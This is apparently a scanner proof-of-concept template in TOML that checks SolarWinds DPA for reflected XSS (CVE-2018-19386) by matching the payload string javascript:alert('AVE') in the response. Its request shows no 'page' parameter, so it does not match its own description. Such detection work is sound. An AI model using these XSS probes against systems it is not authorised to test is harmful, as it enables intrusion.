[info]
author = "ave"
description = "检测 SolarWinds DPA idcStateError 组件是否存在反射型 XSS 漏洞，通过 page 参数注入 JavaScript 代码并验证回显"
id = "POC-AVE-2018-0147"
name = "CVE-2018-19386 PoC"
severity = "medium"
tags = ["cve-2018-19386"]
vuln_id = [
    "CVE-2018-19386",
    "AVE-2018-0147",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/iwc/idcStateError.iwc"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["javascript:alert('AVE')"]
